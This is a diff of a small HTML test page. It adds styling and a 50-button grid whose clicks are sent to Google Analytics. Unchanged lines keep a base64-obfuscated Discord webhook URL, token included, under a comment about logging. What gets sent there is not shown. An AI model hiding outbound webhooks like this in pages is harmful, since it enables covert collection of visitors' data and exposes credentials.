@@ -21,6 +21,10 @@
   </script>
 
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       background: #0f172a;
       color: #f8fafc;
@@ -28,15 +32,15 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
+      justify-content: flex-start;
       min-height: 100vh;
       margin: 0;
-      padding: 1.5rem;
+      padding: 2rem 1rem;
       text-align: center;
     }
 
     .box {
-      max-width: 480px;
+      max-width: 520px;
       width: 100%;
     }
 
@@ -59,10 +63,68 @@
     }
 
     .timer-display {
-      font-size: 3rem;
+      font-size: 2.75rem;
       font-weight: 700;
       font-family: monospace;
       color: #38bdf8;
+    }
+
+    /* Interactive Status Card */
+    .interaction-panel {
+      margin: 1.5rem 0;
+      padding: 1rem;
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 12px;
+    }
+
+    .selected-text {
+      font-size: 1.15rem;
+      color: #f8fafc;
+      font-weight: 600;
+    }
+
+    .selected-text span {
+      color: #38bdf8;
+      font-family: monospace;
+      font-size: 1.35rem;
+    }
+
+    /* 1 to 50 Button Grid */
+    .button-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(42px, 1fr));
+      gap: 0.45rem;
+      margin-top: 1rem;
+      max-height: 240px;
+      overflow-y: auto;
+      padding: 0.5rem;
+      background: #0b1120;
+      border-radius: 8px;
+      border: 1px solid #1e293b;
+    }
+
+    .num-btn {
+      background: #1e293b;
+      color: #f8fafc;
+      border: 1px solid #334155;
+      border-radius: 6px;
+      padding: 0.55rem 0;
+      font-size: 0.9rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.15s ease-in-out;
+    }
+
+    .num-btn:hover {
+      background: #38bdf8;
+      color: #0f172a;
+      border-color: #38bdf8;
+      transform: translateY(-1px);
+    }
+
+    .num-btn:active {
+      transform: scale(0.95);
     }
 
     #log {
@@ -91,11 +153,36 @@
       <div class="timer-display" id="timer">1s</div>
     </div>
 
+    <!-- 1 to 50 Interactive Numbers Panel -->
+    <div class="interaction-panel">
+      <div class="selected-text" id="statusText">Click any number: <span>None</span></div>
+      <div class="button-grid" id="buttonGrid"></div>
+    </div>
+
     <div id="log">Starting test...</div>
   </div>
 
   <script>
-    // 1. Looping Timer (Starts at 1, goes up to 60, resets to 1)
+    // 1. Generate 1 to 50 Interactive Buttons
+    const grid = document.getElementById("buttonGrid");
+    const statusText = document.getElementById("statusText");
+
+    for (let i = 1; i <= 50; i++) {
+      const btn = document.createElement("button");
+      btn.className = "num-btn";
+      btn.textContent = i;
+      btn.onclick = () => {
+        statusText.innerHTML = `You selected: <span>Button #${i}</span>`;
+        // Send interaction event to GA4
+        gtag('event', 'button_click', {
+          'button_number': i,
+          'interaction_type': 'numeric_grid'
+        });
+      };
+      grid.appendChild(btn);
+    }
+
+    // 2. Looping Timer (Starts at 1, goes up to 60, resets to 1)
     let seconds = 1;
     const timerElement = document.getElementById("timer");
 
@@ -107,7 +194,7 @@
       timerElement.textContent = `${seconds}s`;
     }, 1000);
 
-    // 2. Logging and Obfuscated Discord Webhook
+    // 3. Logging and Obfuscated Discord Webhook
     const _p = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MzU1MTIzMDY1ODQxNjc5MS9BUmdSd2ZFOVZlMExCQXBsX0YtaS1Hc1hwNkt6aGJURUM1QkVfN3dCeGc0ZHFjbnozOXZVLWZ2WWlVaUdaY3JfVnZnTQ==";
 
     const logBox = document.getElementById("log");
